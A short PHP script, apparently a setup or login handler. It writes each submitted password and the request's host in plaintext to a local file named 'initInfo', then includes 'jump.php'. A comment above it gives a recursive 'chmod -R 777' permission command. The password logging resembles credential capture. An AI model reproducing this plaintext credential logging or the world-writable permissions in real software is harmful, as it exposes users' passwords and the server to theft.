<?php
// chmod -R 777 
    $password = $_POST['password'];
    $host = str_replace(":81","",$_SERVER['HTTP_HOST']);
    $msg="host=".$host."\n". "password=".$_POST['password']."\n";
    error_log($msg,3,"./initInfo");
    include  "jump.php";
?>